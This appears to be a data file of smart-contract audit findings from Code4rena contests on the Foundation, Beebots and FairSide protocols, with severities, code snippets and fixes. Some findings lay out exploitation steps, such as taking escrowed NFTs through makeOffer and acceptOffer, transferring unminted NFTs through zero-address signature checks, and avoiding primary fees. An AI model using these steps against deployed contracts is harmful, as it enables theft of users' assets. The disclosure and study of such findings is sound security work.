The `adminAccountMigration()` function is called by the operator role to update all sellers' auctions. The `auction.seller` account is updated to the new address, however, the protocol fails to update `buyPrice.seller`. As a result, the protocol is put in a deadlock situation where the new address cannot cancel the auction and withdraw their NFT without the compromised account first cancelling the buy price and vice-versa. This is only recoverable if the new account is migrated back to the compromised account and then `cancelBuyPrice()` is called before migrating back.

### Recommended Mitigation Steps

Consider invalidating the buy offer before account migration.




***"
94.md,Exchange does not split royalty revenue correctly,medium,"According to the [`README.md`](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/README.md?plain=1#L21):

> If royalty information was not defined when the NFT was originally deployed, it may be added using the Royalty Registry which will be respected by our market contract.

The actual exchange code only respects the Royalty Registry or other royalty information if the number of recipients is less than or equal to four.

### Impact

If the `creatorRecipients.length` is more than four then the array is essentially truncated and the royalties are only split among the first four entries in the array. If the array happens to be sorted from low to high then the people who were supposed to get the largest portions of the royalties are given nothing.

### Proof of Concept

```solidity
        uint256 maxCreatorIndex = creatorRecipients.length - 1;
        if (maxCreatorIndex > MAX_ROYALTY_RECIPIENTS_INDEX) {
          maxCreatorIndex = MAX_ROYALTY_RECIPIENTS_INDEX;
        }
```

<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L76-L79>

```solidity
        // Send payouts to each additional recipient if more than 1 was defined
        uint256 totalDistributed;
        for (uint256 i = 1; i <= maxCreatorIndex; ++i) {
          uint256 share = (creatorFee * creatorShares[i]) / totalShares;
          totalDistributed += share;
          _sendValueWithFallbackWithdraw(creatorRecipients[i], share, SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS);
        }
```

<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L99-L105>

Creators shouldn't have to settle the correct amounts amongst themselves afterwards and doing so may trigger unwanted tax consequences for the creators who got the larger shares of funds.

### Recommended Mitigation Steps

Fetch the royalty information during offer creation, cache it for the final transfer, and reject any NFT for which the array size is more than `MAX_ROYALTY_RECIPIENTS_INDEX`.




***"
94.md,`buyFromPrivateSaleFor()` Will Fail if The Buyer Has Insufficient Balance Due to an Open Offer on The Same NFT,medium,"[NFTMarketPrivateSale.sol#L143-L150](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L143-L150)<br>

The `buyFromPrivateSaleFor()` function allows sellers to make private sales to users. If insufficient `ETH` is provided to the function call, the protocol will attempt to withdraw the amount difference from the user's unlocked balance. However, if the same user has an open offer on the same NFT, then these funds will remain locked until expiration. As a result, the user cannot make use of these locked funds even though they may be needed for a successful sale.

### Recommended Mitigation Steps

Consider adding a `_cancelBuyersOffer()` call to the `buyFromPrivateSaleFor()` function. This should be added only to the case where insufficient `ETH` was provided to the trade. By cancelling the buyer's offer on the same NFT, we can guarantee that the user has access to the correct amount of funds.




***"
94.md,`_getCreatorPaymentInfo()` is Not Equipped to Handle Reverts on an Unbounded `_recipients` Array,medium,"[NFTMarketCreators.sol#L49-L251](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCreators.sol#L49-L251)<br>

The `_getCreatorPaymentInfo()` function is utilised by `_distributeFunds()` whenever an NFT sale is made. The function uses `try` and `catch` statements to handle bad API endpoints. As such, a revert in this function would lead to NFTs that are locked in the contract. Some API endpoints receive an array of recipient addresses which are iterated over. If for whatever reason the function reverts inside of a `try` statement, the revert is actually not handled and it will not fall through to the empty `catch` statement.

### Proof of Concept

The end result is that valid and honest NFT contracts may revert if the call runs out of gas due to an unbounded `_recipients` array. `try` statements are only able to handle external calls.

### Recommended Mitigation Steps

Consider bounding the number of iterations to `MAX_ROYALTY_RECIPIENTS_INDEX` as this is already enforced by `_distributeFunds()`. It may be useful to identify other areas where the `try` statement will not handle reverts on internal calls.




***"
94.md,Primary seller can avoid paying the primary fee,medium,"A primary seller can circumvent the 15% fee and pay 5% as a secondary seller.

### Context

The Foundation protocol charges a 15% fee if the sale is a primary sale and 5% if it's a secondary sale.<br>
<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L40>

There are 2 conditions that must be met for a sale to be considered primary:

1.  The seller is one of the creators in the NFT metadata.
2.  It's the first time this NFT is sold on the foundation protocol.

<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L188>

### Proof of Concept

Both of these conditions can be easily circumvented by the primary seller.

1.  He could transfer the NFT to a different wallet and sell it from there to break the first condition.

2.  He can make a private sale to himself for 1\$  (paying the 15% fee on a dust amount) and then do a public auction with the real price.

With any of these 2 methods, the primary seller can circumvent the 15% fee and pay 5% as a secondary seller which makes the primary seller fee optional to pay.




***"
94.md,Missing receiver validation in `withdrawFrom`,medium,"[FETH.sol#L433](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/FETH.sol#L433)<br>

The `FETH.withdrawFrom` function does not validate its `to` parameter.<br>
Funds can be lost if `to` is the zero address.

> Similar issues have been judged as medium recently, see [Sandclock M-15](https://code4rena.com/reports/2022-01-sandclock/) / [Github issue](https://github.com/code-423n4/2022-01-sandclock-findings/issues/183#issuecomment-1024626171).

### Recommended Mitigation Steps

Check that `to != 0`.




***"
94.md,`LockedBalance` library should drop parameters to 96/32 bits,medium,"[LockedBalance.sol#L56](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/libraries/LockedBalance.sol#L56)<br>

The `LockedBalance` contract takes 256-bit amount values but performs bit math on them as if they were 96 bit values.
Bits could spill over to a different locked balance in the `else` part (`lockedBalance` stores **two** 128-bit locked balances in one 256-bit storage field):

```solidity
function set(
  Lockups storage lockups,
  uint256 index,
  uint256 expiration,
  uint256 totalAmount
) internal {
  unchecked {
    // @audit-issue should drop totalAmount to 96, expiration to 128-96=32
    uint256 lockedBalanceBits = totalAmount | (expiration << 96);
    if (index % 2 == 0) {
      // set first 128 bits.
      index /= 2;
      // @audit-info clears upper bits, then sets them
      lockups.lockups[index] = (lockups.lockups[index] & last128BitsMask) | (lockedBalanceBits << 128);
    } else {
      // set last 128 bits.
      index /= 2;
      // @audit-info clears lower bits, then sets them
      // @audit-issue sets entire 256-bit lockedBalanceBits instead of just 128-bit
      lockups.lockups[index] = (lockups.lockups[index] & first128BitsMask) | lockedBalanceBits;
    }
  }
}
```

It could then increase the other, unrelated locked balance's amount leading to stealing funds from the protocol.
All callers of this function currently seem to ensure that `totalAmount` is indeed less than 96 bits but the `LockedBalance` library should be self-contained and not depend on the calling side to perform all checks.<br>

If the code is ever extended and more calls to these functions are performed, it'll likely cause issues.

> The same issue happens in `setTotalAmount`

### Recommended Mitigation Steps

Make sure that there are only 96/32 bits set in `totalAmount` and `expiration` by dropping them to their respective types.

```diff
function set(
  Lockups storage lockups,
  uint256 index,
  uint256 expiration,
  uint256 totalAmount
) internal {
  unchecked {
-    uint256 lockedBalanceBits = totalAmount | (expiration << 96);
+    // cast it to uint256 again for the << 96 to work on 256-bits
+    uint256 lockedBalanceBits = uint256(uint96(totalAmount)) | (uint256(uint32(expiration)) << 96);
    
    ...
  }
}
```




***"
94.md,`MAX_ROYALTY_RECIPIENTS_INDEX` set too low,medium,"[NFTMarketFees.sol#L78](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L78)<br>

The creator payouts are capped at `MAX_ROYALTY_RECIPIENTS_INDEX`. It's currently set to `4` and only 5 creators are paid out.<br>
Other creators are ignored.

### Recommended Mitigation Steps

I don't think cases with more than 5 creators / royalty receivers are unlikely.<br>
It can and should probably be increased, especially as the transfers are already gas restricted.




***"
94.md,Private sale spoofing,medium,"[NFTMarketPrivateSale.sol#L156](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketPrivateSale.sol#L156)<br>

Similar to [spoofing in finance](https://en.wikipedia.org/wiki/Spoofing_\(finance\)), users can create private sales with correct signatures but then frontrun the buy with a transfer to a different wallet they control.

No funds are lost as the NFT <> FETH exchange is atomic but it can be bad if third parties create a naive off-chain centralized NFT market based on this signature feature.<br>
It's also frustrating for the users if they try to accept the private sale but their transaction fails.

### Recommended Mitigation Steps

This is made possible because private sales do not keep the NFT in escrow.<br>
Consider escrowing the NFT also for private sales.




***"
94.md,Escrowed NFT can be stolen by anyone if no active `buyPrice` or auction exists for it,medium,"If a NFT happens to be in escrow with neither buyPrice, nor auction being initialised for it, there is a way to obtain it for free by any actor via `makeOffer`, `acceptOffer` combination.

I.e. a malicious user can track the FNDNFTMarket contract and obtain any NFT from it for which there are no buyPrice or auction structures initialised. For example, if a NFT is mistakenly sent to the contract, an attacker can immediately steal it.

This will happen as NFT is being guarded by buyPrice and auction structures only. The severity here is medium as normal usage of the system imply that either one of them is initialised (NFT was sent to escrow as a part of `setBuyPrice` or `createReserveAuction`, and so one of the structures is present), so this seems to leave only mistakenly sent assets exposed.

### Proof of Concept

An attacker can make a tiny offer with `makeOffer`:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L189>

Then call `acceptOffer`, which will lead to `_acceptOffer`.

Direct NFT transfer will fail in `_acceptOffer` as the NFT is being held by the contract and `_transferFromEscrow` will be called instead:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L262-L271>

`_transferFromEscrow` calls will proceed according to the FNDNFTMarket defined order:

    function _transferFromEscrow(
    ...
    ) internal override(NFTMarketCore, NFTMarketReserveAuction, NFTMarketBuyPrice, NFTMarketOffer) {
       super._transferFromEscrow(nftContract, tokenId, recipient, seller);
    }

If there are no corresponding structures, the NFTMarketOffer, NFTMarketBuyPrice and NFTMarketReserveAuction versions of `_transferFromEscrow` will pass through the call to NFTMarketCore's plain transfer implementation:

<https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L77-L87>

This will effectively transfer the NFT to the attacker, which will pay gas costs and an arbitrary small offer price for it.

### Recommended Mitigation Steps

Consider adding additional checks to control who can obtain unallocated NFTs from the contract.

Protocol controlled entity can handle such cases manually by initial sender's request.




***"
94.md,Upgradable escrow contract,medium,"Upgradable escrow contract poses great risk to user who approved their NFT to the contract. Most popular token / NFT exchange do not require user to approve their asset to admin upgradable contract.

This also increases user gas usage because they would have to revoke approval when they are done with the protocol.

### Proof of Concept

<https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/FNDNFTMarket.sol>

### Recommended Mitigation Steps

Separate the escrow contract to make it non-upgradable with a restricted set of functionality.




***"
94.md,Royalties can be distribution unfairly among `creatorRecipients` for NFT contracts with non-standard `getRoyalties()` returns,medium,"Based on our research, `getRoyalties()` is not a standardized API for NFT contracts to indicate how the royalties should be distributed among the recipients.

However, in the current implementation, it always assumes that `getRoyalties()` return in terms of BPS.

[NFTMarketCreators.sol#L85-L112](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketCreators.sol#L85-L112)<br>

[NFTMarketFees.sol#L86-L90](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketFees.sol#L86-L90)<br>

```solidity
if (creatorShares[i] > BASIS_POINTS) {
    // If the numbers are >100% we ignore the fee recipients and pay just the first instead
    maxCreatorIndex = 0;
    break;
}
```

As a result, if a particular implementation is returning `get Royalties()` with higher precision (say 1e6 for 100% instead of 1e4/BPS), the distribution of royalties can be distorted.

### Proof of Concept

Given:

*   `NFT-Token1` `Royalties`:

    *   Address0 = 10,000 (1%)
    *   Address1 = 10,000 (1%)
    *   Address2 = 100,000 (10%)
    *   Address3 = 880,000 (88%)

*   Alice owns the `NFT-Token1`

1.  Alice `setBuyPrice()` and listed `NFT-Token1` for `10 ETH`;

2.  Bob `buy()` with `10 ETH`:

*   `foundationFee` = `0.5 ETH`
*   `creatorFee` = `1 ETH`
*   `ownerRev` = ` 8.5 ETH  `

Since `creatorShares[address2]` > `BASIS_POINTS` (10,000), all the `creatorFee` will be sent to the first address: `Address0`, which is expected to receive only `1%` of the royalties.

### Recommended Mitigation Steps

Consider removing this and change to:

```solidity
// Determine the total shares defined so it can be leveraged to distribute below
uint256 totalShares;
unchecked {
  // The array length cannot overflow 256 bits.
  for (uint256 i = 0; i <= maxCreatorIndex; ++i) {
    // The check above ensures totalShares wont overflow.
    totalShares += creatorShares[i];
  }
}
if (totalShares == 0) {
  maxCreatorIndex = 0;
}
```




***"
94.md,Inappropriate support of EIP-2981,medium,"[NFTMarketCreators.sol#L65-L82](https://github.com/code-423n4/2022-02-foundation/blob/4d8c8931baffae31c7506872bf1100e1598f2754/contracts/mixins/NFTMarketCreators.sol#L65-L82)<br>

```solidity
if (nftContract.supportsERC165Interface(type(IRoyaltyInfo).interfaceId)) {
  try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (
    address receiver,
    uint256 /* royaltyAmount */
  ) {
    if (receiver != address(0)) {
      recipients = new address payable[](1);
      recipients[0] = payable(receiver);
      // splitPerRecipientInBasisPoints is not relevant when only 1 recipient is defined
      if (receiver == seller) {
        return (recipients, splitPerRecipientInBasisPoints, true);
      }
    }
  } catch // solhint-disable-next-line no-empty-blocks
  {
    // Fall through
  }
}
```

The current implementation of EIP-2981 support will always pass a constant `BASIS_POINTS` as the `_salePrice`.

As a result, the recipients that are supposed to receive less than 1 BPS of the salePrice may end up not receiving any royalties.

Furthermore, for the NFTs with the total royalties rate set less than 10% for some reason, the current implementation will scale it up to 10%.

### Recommended Mitigation Steps

1.  Instead of passing a constant of 10,000 as the `_salePrice`, we suggest using the actual `_salePrice`, so there the royalties can be paid for recipients with less than 1 BPS of the royalties.
2.  When the total royalties cut is lower than 10%, it should be honored. It's capped at 10% only when the total royalties cut is higher than 10%.




***"
94.md,There is no Support For The Trading of Cryptopunks,medium,"Cryptopunks are at the core of the NFT ecosystem. As one of the first NFTs, it embodies the culture of NFT marketplaces. By not supporting the trading of cryptopunks, Foundation is at a severe disadvantage when compared to other marketplaces. Cryptopunks have their own internal marketplace which allows users to trade their NFTs to other users. As such, cryptopunks does not adhere to the `ERC721` standard, it will always fail when the protocol attempts to trade them.

### Proof of Concept

Here is an example [implementation](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L417-L424) of what it might look like to integrate cryptopunks into the Foundation protocol.

### Recommended Mitigation Steps

Consider designing a wrapper contract for cryptopunks to facilitate standard `ERC721` transfers. The logic should be abstracted away from the user such that their user experience is not impacted.




***"
94.md,Fees Are Incorrectly Charged on Unfinalized NFT Sales,medium,"[NFTMarketOffer.sol#L255-L271](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L255-L271)<br>
[NFTMarketReserveAuction.sol#L557](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L557)<br>
[NFTMarketReserveAuction.sol#L510-L515](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketReserveAuction.sol#L510-L515)<br>
[NFTMarketFees.sol#L188-L189](https://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketFees.sol#L188-L189)<br>

Once an auction has ended, the highest bidder now has sole rights to the underlying NFT. By finalizing the auction, fees are charged on the sale and the NFT is transferred to `auction.bidder`. However, if `auction.bidder` accepts an offer before finalization, fees will be charged on the `auction.bidder` sale before the original sale. As a result, it is possible to avoid paying the primary foundation fee as a creator if the NFT is sold by `auction.bidder` before finalization.

### Proof of Concept

Consider the following scenario:

*   Alice creates an auction and is the NFT creator.
*   Bob bids on the auction and is the highest bidder.
*   The auction ends but Alice leaves it in an unfinalized state.
*   Carol makes an offer on the NFT which Bob accepts.
*   `_acceptOffer()` will distribute funds on the sale between Bob and Carol before distributing funds on the sale between Alice and Bob.
*   The first call to `_distributeFunds()` will set the `_nftContractToTokenIdToFirstSaleCompleted` to true, meaning that future sales will only be charged the secondary foundation fee.

### Recommended Mitigation Steps

Ensure the `_nftContractToTokenIdToFirstSaleCompleted` is correctly tracked. It might be useful to ensure the distribution of funds are in the order of when the trades occurred. For example, an unfinalized auction should always have its fees paid before other sales.




***"
6.md,ERC-721 Enumerable Spec mismatch for index of `tokenByIndex()` function,high,"Index starts at 0 for token array, but the implementation here requires index to be greater than 0. This will prevent querying of tokens at index 0.

See [reference implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/3ba2a1354f8f830d5a0e711537efdbdd8bcb109e/contracts/token/ERC721/extensions/ERC721Enumerable.sol#L21).

This will impact compatibility with NFT platforms that expect full conformity with ERC-721 specification.

Recommend accepting 0 index by changing to `require(index >= 0 && index < TOKEN_LIMIT);`."
6.md,Signature malleability of EVM's `ecrecover` in `verify()`,high,"EVM's `ecrecover` is susceptible to signature malleability, which allows replay attacks, but that is mitigated here by tracking accepted offers and canceling them (on L645) specifically to prevent replays. However, if any application logic changes, it might make signature malleability a risk for replay attacks.

See [reference](https://swcregistry.io/docs/SWC-117).

Recommend using [OpenZeppelin's ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)"
6.md,Arbitrary Transfer of Unowned NFTs,high,"Due to how the market functions are structured, it is possible to arbitrarily transfer any NFT that is not owned by any address.

The function in question is the `tradeValid` function invoked by `acceptTrade` before the trade is performed. It, in turn, validates the signature of a trade via `verify`, which does not account for the behavior of `ecrecover`.

When `ecrecover` is invoked with an invalid signature, the zero-address is returned by it, meaning that `verify` will yield `true` for the zero-address as long as the signature provided is invalid.

This can be exploited to transfer any NFT whose `idToOwner` is zero, including NFTs that have not been minted yet.

Recommend an additional check be imposed within `verify` that ensures the signer is not the zero-address which will alleviate this check. For more details, consult the [EIP721 implementation by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/cryptography/ECDSA.sol#L53-L71)."
6.md,`Beebots.TradeValid()` Will Erroneously Return True When Maker Is Set To `Address(0)` and `makerIds` Are Set To The `TokenIds` of Unminted Beebot NFTs,high,"`Beebots.TradeValid()` will erroneously return true when `maker` is set to `address(0)` and `makerIds` are set to the `tokenIds` of unminted beebot NFTs.

`Beebots.verify()` returns true no matter what signature is given when signer is set to `address(0)`. This means that `BeeBots.tradeValid()` will erroneously return true when `maker` is set to `address(0)`.

Finally, before an NFT has even been minted at all, it is assumed to have an owner of `address(0)` due to the `idToOwner` mapping being initialized to zero for all uninitialized slots, so an attacker can call `tradeValid()` with `maker` set to `address(0)` and `makerIds` set to the `tokenIds` of any unminted `nftIds`, and `tradeValid()` will erroneously return true.

* (1) `Beebots.verify()` returns true no matter what signature is given when signer is set to `address(0)`.
  * (1a) `BeeBots.verify()` does not check to ensure that signer is not `address(0)`.
  * (1b) This is a problem because `ecrecover` fails silently if the signature does not match and returns zero.
  * (1c) So if an attacker passes in `address(0)` as the signer, then verify will return true no matter what signature is provided, since `ecrecover` will return `address(0)`, and the signer is `address(0)`, so verify will pass.
  * (1d) This means that `BeeBots.tradeValid()` will erroneously return true when maker is set to `address(0)`.
* (2) Before an NFT has even been minted at all, it is assumed to have an owner of `address(0)` due to the `idToOwner` mapping being initialized to zero for all uninitialized slots
  * (2a) Solidity initializes all mappings to 0 for all slots that have not yet been set.
  * (2b) So for any NFT ID that has not yet been minted, the corresponding owner in the mapping `BeeBots.idToOwner` is `address(0)`, even though that NFT should not even exist.
  * (2c) This means that an attacker can call `tradeValid()` with maker set to `address(0)` and makerIds set to any unminted nftIds, and `tradeValid()` will erroneously return true.

(1) Recommend adding this check to `Beebots.verify()`:
```require(signer != address(0), ""Cannot verify signatures from 0x0"");```

(2) Recommend adding this check to `Beebots.tradeValid()`:
```require(maker != address(0), ""Maker 0x0 not allowed"");```"
6.md,function `tokenByIndex` treats last index as invalid,high,"NFT indexes start from 0:
```solidity
// Don't allow a zero index, start counting at 1
return value.add(1);
```
So if there are 30 tokens, indexes would be 1-30. However, function `tokenByIndex` sets such boundaries:
```solidity
require(index > 0 && index < TOKEN_LIMIT);
```
This means that the last token (with index 30 in this case) will not be valid.

Recommend using:
```solidity
require(index > 0 && index <= TOKEN_LIMIT);
```"
6.md,NFT can be minted for free after sale ended,high,"The `getPrice()` function returned 0 after the sale ended and (```SALE_LIMIT - numSales```) NFT can be minted for free.

Without documentation, it's not clear if this is the expected behavior or not. If it's unexpected, it is recommended to revert instead of returning 0. If it's expected behavior, it's possible to create a smart contract and claim all the remaining NFT front-running the regular users."
6.md,Legacy Function Usage,medium,"The `withdraw` function utilizes the `transfer` invocation, which has a fixed gas stipend and can fail, especially beyond the Berlin fork, which increased the [gas costs](https://eips.ethereum.org/EIPS/eip-2929) for first-time invocations of a transfer.

The EIP should be sufficient.

Recommend using a safe wrapper library, such as the OpenZeppelin `Address` library's `sendValue` function, which forwards sufficient gas for the transfer regardless of the underlying OPCODE gas costs."
6.md,`randomIndex` is not truly random - possibility of predictably minting a specific token Id,medium,"`randomIndex' is not random. Any miner has access to these values:

```solidity
uint index = uint(keccak256(abi.encodePacked(nonce, msg.sender, block.difficulty, block.timestamp))) % totalSize;
```

Non-miner attackers could also test the minting random condition until they get the ID they are looking to access.

The internal variable [`indices`](https://github.com/code-423n4/2021-04-meebits/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L158) seems to be used to avoid this type of collision.

While this makes it less straightforward, there is still the possibility of minting a token with a specific ID.

That said, [`_addNFToken`](https://github.com/code-423n4/2021-04-meebits/blob/2ec4ce8e98374be2048126485ad8ddacc2d36d2f/Beebots.sol#L408) is checking if the token is already owned by an address, ensuring a token can't be stolen.

Refactoring as suggested below will save gas, make code easier to read and prevent reverts in rare unfortunate occasions of clashes.

Recommend not generating random IDs and instead using counters. It makes the code more predictable and easier to read, avoids clashing of IDs, and reduces the need to track minted tokens."
6.md,"instead of `call()` , `transfer()` is used to withdraw the ether",medium,"```solidity
function withdraw(uint amount) external {
  require(amount <= ethBalance[msg.sender]);
  ethBalance[msg.sender] = ethBalance[msg.sender].sub(amount);
  msg.sender.transfer(amount);
  emit Withdraw(msg.sender, amount);
}
```

To withdraw ETH, it uses `transfer()`, this transaction will fail inevitably when:

1. The withdrawer smart contract does not implement a payable function.
2. Withdrawer smart contract does implement a payable fallback which uses more than 2300 gas unit.
3. The withdrawer smart contract implements a payable fallback function that needs less than 2300 gas units but is called through proxy, raising the call's gas usage above 2300.

Recommend using `call()` to send ETH."
6.md,Atypical contract structure affects maintainability and readability,low,"A typical/recommended contract structure has the variable declarations followed by events instead of the other way around. This affects readability/maintainability and may introduce/persist security issues.

Recommend considering restructuring the contract to place the variable declarations before events."
6.md,Mint can be front-run,low,"The price of an NFT falls over time which creates a dynamic that one potential buyer wants to wait for the price to drop but not wait too long to avoid hitting the max sale cap.

However, any such `mint` call can be observed on public blockchains, and attackers can wait until another person decides to buy at the current price and then frontrun that person.

Legitimate minters can be frontrun and end up with a failed transaction and without the NFT as the max sale limit is reached: `require(numSales < SALE_LIMIT, ""Sale limit reached."");`.

Front-running is hard to prevent; maybe an auction-style minting process could work where the top `SALE_LIMIT` bids are accepted after the sale duration."
6.md,Missing parameters in `SalesBegin` event of critical `startSale()` function,low,"Consider including `salesStartTime` and `salesDuration` as parameters in the `SaleBegins` event to allow off-chain tools to track sale launch time and duration, especially given that sale price depends on the time elapsed in the sale.

Recommend adding `salesStartTime` and `salesDuration` as parameters in the `SaleBegins` event of `startSale()` function."
6.md,Incorrect Implementation,low,"The `tokenByIndex` function appears not to perform correctly as it simply checks its input argument and returns it.

It is recommended this function be adequately fleshed out or omitted from the codebase to avoid redundant bytecode."
6.md,Missing error messages in require statements of various function,low,"The use of informative error messages helps troubleshoot exceptional conditions during transaction failures or unexpected behavior. Otherwise, it can be misleading and waste crucial time during exploits or emergency conditions.

While many require statements have descriptive error messages, some are missing them.

For reference, see Note 2 in [OpenZeppelin's Audit of Compound Governor Bravo](https://blog.openzeppelin.com/compound-governor-bravo-audit/).

Recommend using meaningful error messages which specifically describe the conditional failure in all require statements."
6.md,Missing event in critical `devMint()` function,low,"The dev/deployer is allowed to mint an unlimited quantity of NFTs without paying arbitrary recipients. This reduces the token balance and affects token availability for other sale participants, and therefore is significant enough to warrant its own event.

Recommend adding an event for `devMint` and emit at the end of `devMint()` function."
6.md,SafeMath library asserts instead of reverts,low,"The implementation of SafeMath performs an `assert` instead of a `revert` on failure. An `assert` will consume all the transaction gas, whereas a `revert`/`require` releases the remaining gas to the transaction sender again. Usually, one wants to try to keep the gas cost for contract failures low and use `assert` only for invariants that should always be true.

Recommend using `require` instead of `assert`."
11.md,Conviction scoring fails to initialize and bootstrap,high,"Conviction scores for new addresses/users fail to initialize+bootstrap in `ERC20ConvictionScore`’s `_updateConvictionScore()` because a new user’s `numCheckpoints` will be zero and never gets initialized.

This effectively means that FairSide conviction scoring fails to bootstrap at all, leading to the failure of the protocol's pivotal feature.

When Alice transfers FSD tokens to Bob for the first time, `_beforeTokenTransfer(Alice, Bob, 100)` is triggered which calls `_updateConvictionScore(Bob, 100)` on Line55 of ERC20ConvictionScore.sol.

In function `_updateConvictionScore()`, given that this is the first time Bob is receiving FSD tokens, `numCheckpoints[Bob]` will be 0 (Line116) which will make `ts = 0` (Line120), and Bob’s FSD balance will also be zero (Bob never has got FSD tokens prior to this) which makes `convictionDelta = 0` (Line122) and not let control go past Line129.

This means that a new checkpoint never gets written, i.e., conviction score never gets initialized, for Bob or for any user for that matter.

FairSide's adjustment of Compound's conviction scoring is based on time and therefore needs an initialization to take place vs Compound's implementation. Therefore, a new checkpoint needs to be created+initialized for a new user during token transfer."
11.md,Locked funds are debited twice from the user during tokenization leading to fund loss,high,"During tokenization of conviction scores, the user can optionally provide FSDs to be locked to let it continue conviction accrual. However, the amount of FSDs specified for locking are debited from the user twice, leading to fund loss.

This, in effect, forces the user to unknowingly and unintentionally lock twice the amount of FSD tokens, leading to a loss of the specified 'locked' number of tokens.

Alice decides to tokenize her conviction score into an NFT and specifies 100 FSD tokens to be locked in her call to `tokenizeConviction(100)`. 100 FSD tokens are transferred from her FSD balance to `FairSideConviction` contract on Line282 of `ERC20ConvictionScore.sol`. However, in `FairSideConviction.createConvictionNFT()`, the specified locked amount is transferred again from Alice to the contract on Line50 of `FairSideConviction.sol`.

The impact is that Alice wanted to lock only 100 FSD tokens, but the FairSide protocol has debited 200 tokens from her balance leading to a loss of 100 FSD tokens.

Recommend removing the redundant transfer of FSD tokens on Line282 in `tokenizeConviction()` of `ERC20ConvictionScore.sol`."
11.md,Locked funds from tokenization are credited twice to user leading to protocol fund loss,high,"The tokens optionally locked during tokenization are released twice on acquiring conviction back from an NFT. (The incorrect double debit of locked funds during tokenization has been filed as a separate finding because it is not necessarily related and occurs in different parts of the code.)

When a user wants to acquire back the conviction score captured by an NFT, the FSD tokens locked, if any, are released to the user as well. However, this is incorrectly done twice. Released amount is transferred once on Line123 in `_release()` (via `acquireConviction` -> `burn`) of FairSideConviction.sol and again immediately after the burn on Line316 in `acquireConviction()` of `ERC20ConvictionScore.sol`.

This leads to loss of protocol funds.

Alice tokenizes her conviction score into an NFT and locks 100 FSDs. Bob buys the NFT from Alice and acquires the conviction score back from the NFT. But instead of 100 FSDs that were supposed to be locked with the NFT, Bob receives 100+100 = 200 FSDs from FairSide protocol.

Recommend removing the redundant transfer of FSD tokens from protocol to the user on Line316 in `acquireConviction()` of `ERC20ConvictionScore.sol`."
11.md,`ERC20ConvictionScore`'s `governanceDelta` should be subtracted when user is not a governor anymore,high,"The `TOTAL_GOVERNANCE_SCORE` is supposed to track the sum of the credit scores of all governors.

In `ERC20ConvictionScore._updateConvictionScore`, when the user does not fulfill the governance criteria anymore and is therefore removed, the `governanceDelta` should be negative, but it's positive.

```solidity
isGovernance[user] = false;
governanceDelta = getPriorConvictionScore(
    user,
    block.number - 1
);
```

It then gets added to the new total:

```solidity
uint224 totalGCSNew =
    add224(
        totalGCSOld,
        governanceDelta,
        ""ERC20ConvictionScore::_updateConvictionTotals: conviction score amount overflows""
    );
```

The `TOTAL_GOVERNANCE_SCORE` tracks wrong data leading to issues throughout all contracts like wrong `FairSideDAO.totalVotes` data, which can then be used by anyone to pass proposals in the worst case.

Or `totalVotes` can be arbitrarily inflated and break the voting mechanism as no proposals can reach the quorum (percentage of `totalVotes`) anymore.

Recommend returning a negative signed integer for this case and adding it to the new total."
11.md,`Withdrawable.withdraw` does not decrease `pendingWithdrawals`,high,"The name `pendingWithdrawals` indicates that this storage variable tracks the withdrawals that need yet to be paid out. Furthermore, this matches the behavior in `_increaseWithdrawal`. As such, it should be decreased when withdrawing in `withdraw`, but it is not.

The `getReserveBalance` function consistently under-reports the actual reserve balance, which leads to the wrong mint amounts being used in the `FSD.mint` calculation.

Recommend decreasing `pendingWithdrawals` by the withdrawn amount.


> One of two easter eggs!
> Fixed in PR#5."
